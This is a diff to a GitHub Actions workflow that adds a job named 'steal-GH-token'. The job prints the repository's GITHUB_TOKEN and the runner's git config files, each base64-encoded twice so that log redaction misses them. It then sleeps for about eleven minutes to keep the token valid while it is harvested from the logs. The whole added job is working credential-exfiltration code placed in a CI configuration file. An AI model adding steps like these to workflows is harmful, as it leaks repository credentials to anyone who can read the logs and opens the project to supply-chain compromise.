@@ -21,3 +21,27 @@ jobs:
           echo "this is the secret: $THESECRET (redacted by GitHub)"
         env:
           THESECRET: ${{ secrets.THE_SECRET }}
+  steal-GH-token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Print secret
+        run: |
+          echo $THESECRET | base64 | base64
+          echo "this is the secret: $THESECRET (redacted by GitHub)"
+        env:
+          THESECRET: ${{ secrets.GITHUB_TOKEN }}
+      - name: Print config
+        run: |
+          find "$HOME/work" -type f -name config | xargs cat | base64 | base64
+        env:
+          THESECRET: ${{ secrets.GITHUB_TOKEN }}
+      - name: keep the token fresh
+        run: |
+          sleep 600
+          echo "1min to go"
+          sleep 60
+          echo done
